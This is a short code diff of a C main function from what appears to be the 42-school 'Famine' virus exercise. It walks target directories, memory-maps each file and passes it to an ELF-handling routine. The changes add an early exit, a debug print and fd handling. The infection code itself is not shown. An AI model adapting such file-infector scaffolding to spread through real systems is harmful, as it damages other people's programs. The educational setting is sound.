@@ -6,7 +6,7 @@
 /*   By: gbourgeo <marvin@42.fr>                    +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/05/20 20:13:56 by gbourgeo          #+#    #+#             */
-/*   Updated: 2018/05/24 00:57:10 by root             ###   ########.fr       */
+/*   Updated: 2018/05/28 18:53:50 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -23,6 +23,7 @@ int				main(void)
 	t_env		e;
 
 	famine64_func();
+	exit(0);
 	ft_memset(&e, 0, sizeof(e));
 	for (int i = 0; dir[i]; i++)
 	{
@@ -33,6 +34,7 @@ int				main(void)
 		void			*data;
 		int				size;
 
+		ft_printf("OK\n");
 		if ((rep = opendir(dir[i])) != NULL)
 		{
 			while ((file = readdir(rep)))
@@ -46,9 +48,10 @@ int				main(void)
 						(size = lseek(fd, 1, SEEK_END)) != -1	&&
 						(data = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) != MAP_FAILED)
 					{
+						close(fd);
 						e.data = data;
 						e.size = size;
-						e.fd = fd;
+						e.path = path;
 #ifdef __linux__
 						get_elf(&e);
 #elif __APPLE__
